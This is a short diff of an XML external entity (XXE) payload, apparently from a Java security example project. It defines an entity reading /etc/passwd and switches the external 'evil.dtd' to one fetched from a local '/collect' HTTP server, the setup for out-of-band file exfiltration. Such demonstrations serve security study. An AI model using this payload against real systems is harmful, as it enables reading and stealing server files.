@@ -3,7 +3,7 @@
         <!ENTITY % file SYSTEM
                 "file:///etc/passwd">
         <!ENTITY % dtd SYSTEM
-                "/home/NIX/glebcher601/Documents/Others/Java Security/xxe-example/evil.dtd">
+                "http://127.0.0.1:8888/collect/dtd/evil.dtd">
 
         %dtd;
         ]>
